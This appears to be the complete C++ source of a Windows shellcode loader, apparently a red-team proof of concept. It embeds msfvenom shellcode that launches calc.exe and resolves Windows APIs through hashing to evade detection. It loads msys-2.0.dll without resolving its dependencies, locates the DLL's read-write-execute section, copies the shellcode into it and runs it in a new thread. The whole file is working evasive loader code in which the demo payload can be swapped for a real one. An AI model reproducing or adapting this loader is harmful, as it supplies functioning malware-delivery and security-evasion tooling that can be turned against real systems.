#include "apis.hpp"

//  msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f C
unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
                      "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
                      "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
                      "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
                      "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
                      "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
                      "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
                      "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
                      "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
                      "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
                      "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
                      "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
                      "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
                      "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
                      "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
                      "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
                      "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
                      "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
                      "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
                      "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

bool setup_memory(void*& blk, size_t& sz)
{
    // DLL with RWX section to leverage
    constexpr auto target_dll        = L"msys-2.0.dll";
    bool                  success        = false;
    HANDLE                dll_base       = nullptr;
    PIMAGE_DOS_HEADER     dos_header     = nullptr;
    PIMAGE_NT_HEADERS     nt_headers     = nullptr;
    PIMAGE_SECTION_HEADER section_header = nullptr;

    dll_base = API(LoadLibraryExW, KERNEL32)(target_dll, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (dll_base == nullptr)
        goto cleanup;

    dos_header = (PIMAGE_DOS_HEADER)dll_base;
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
        goto cleanup;

    nt_headers = rva2_va<PIMAGE_NT_HEADERS>(dll_base, dos_header->e_lfanew);
    if (nt_headers->Signature != IMAGE_NT_SIGNATURE)
        goto cleanup;

    section_header = IMAGE_FIRST_SECTION(nt_headers);
    for (auto i{0}; i < nt_headers->FileHeader.NumberOfSections; i++, section_header++)
    {
        if (section_header->Characteristics & IMAGE_SCN_MEM_EXECUTE
            && section_header->Characteristics & IMAGE_SCN_MEM_READ
            && section_header->Characteristics & IMAGE_SCN_MEM_WRITE)
        {
            blk     = rva2_va<PVOID>(dll_base, section_header->VirtualAddress);
            sz      = section_header->SizeOfRawData;
            success = true;
            break;
        }
    }

cleanup:

    return success;
}

bool retrieve_sc(void*& sc, size_t& sz)
{
    sc = buf;
    sz = sizeof(buf);
    return true;
}

bool copy_sc(void* blk, size_t blk_sz, void* sc, size_t sc_sz)
{
    bool success = false;
    auto thread  = INVALID_HANDLE_VALUE;
    if (blk_sz < sc_sz)
        goto cleanup;

    (void)memcpy(blk, sc, sc_sz);
    success = true;

cleanup:
    return success;
}

bool execute_sc(void* blk)
{
    bool success = false;
    auto thread  = API(CreateThread, KERNEL32)(NULL, 0, (LPTHREAD_START_ROUTINE)blk, NULL, 0, NULL);
    if (thread == nullptr)
        goto cleanup;

    success = true;
    API(WaitForSingleObject, KERNEL32)(thread, INFINITE);
    API(CloseHandle, KERNEL32)(thread);

cleanup:
    return success;
}

int main()
{
    auto   success = false;
    void * blk, *sc      = nullptr;
    size_t blk_sz, sc_sz = 0;

    if (success = initialize_api_hashing(); !success)
        goto cleanup;

    if (success = setup_memory(blk, blk_sz); !success)
        goto cleanup;

    if (success = retrieve_sc(sc, sc_sz); !success)
        goto cleanup;

    if (success = copy_sc(blk, blk_sz, sc, sc_sz); !success)
        goto cleanup;

    if (success = execute_sc(blk); !success)
        goto cleanup;

cleanup:
    return success ? 0 : 1;
}